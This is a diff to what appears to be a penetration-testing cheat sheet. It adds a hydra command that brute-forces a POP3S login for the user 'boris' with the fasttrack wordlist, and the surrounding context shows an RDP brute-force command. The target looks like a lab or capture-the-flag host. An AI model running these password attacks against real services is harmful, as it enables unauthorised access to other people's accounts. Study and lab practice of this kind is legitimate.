@@ -26,7 +26,10 @@ You can attack a Windows Remote Desktop with a password list!
 
 `$ hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>`
 
-
+## Bruteforce POP3
+```bash
+$ hydra -l boris -P /usr/share/wordlists/fasttrack.txt pop3s://10.10.125.25:55006    
+```
 
 
 ## Bruteforce HTTP login pages
